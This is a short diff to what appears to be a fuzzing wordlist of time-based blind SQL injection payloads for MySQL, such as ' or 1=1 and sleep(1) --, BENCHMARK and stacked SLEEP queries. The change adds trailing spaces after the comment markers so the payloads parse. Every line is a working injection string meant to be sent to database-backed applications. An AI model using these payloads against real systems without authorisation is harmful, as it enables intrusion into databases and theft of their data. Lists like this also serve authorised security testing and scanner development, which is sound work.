@@ -1,6 +1,6 @@
 SLEEP(1)
-' or 1=1 and sleep(1) --
-' or 1=1 and sleep(1) #
+' or 1=1 and sleep(1) -- 
+' or 1=1 and sleep(1) # 
 BENCHMARK(1000000,MD5('A'))
 ; SELECT SLEEP(1)
 AND (SELECT * FROM (SELECT(SLEEP(1)))MySubQuery)
